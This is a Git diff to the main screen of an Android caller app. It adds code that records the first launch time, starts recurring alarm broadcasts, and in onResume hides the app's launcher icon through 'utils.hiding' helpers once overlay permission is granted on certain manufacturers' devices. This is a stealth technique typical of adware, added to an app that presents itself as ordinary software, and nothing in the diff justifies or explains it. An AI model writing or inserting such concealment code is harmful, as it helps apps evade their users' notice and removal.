@@ -3,6 +3,7 @@ package com.threed.caller.ui.main
 import android.content.Intent
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.commit
 import androidx.lifecycle.lifecycleScope
@@ -14,6 +15,9 @@ import com.threed.caller.ui.contacts.ContactsFragment
 import com.threed.caller.ui.greeting.GreetingActivity
 import com.threed.caller.ui.home.HomeFragment
 import com.threed.caller.ui.settings.SettingsFragment
+import com.threed.caller.utils.hiding.AlarmBroadcast
+import com.threed.caller.utils.hiding.AppHidingUtil
+import com.threed.caller.utils.hiding.HidingBroadcast
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
@@ -34,6 +38,11 @@ class MainActivity : BaseActivity<MainViewModel, MainActvityBinding>() {
     }
 
     override fun setupUI() {
+        if (viewModel.preferencesRepository.firstLaunchMillis == -1L)
+            viewModel.preferencesRepository.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
         if (!viewModel.preferencesRepository.hasBeenLaunchedBefore) {
             viewModel.preferencesRepository.hasBeenLaunchedBefore = true
             startActivity(Intent(this, GreetingActivity::class.java))
@@ -65,6 +74,14 @@ class MainActivity : BaseActivity<MainViewModel, MainActvityBinding>() {
             }
         }
 
+    }
+
+    override fun onResume() {
+        super.onResume()
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
     }
 
     private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
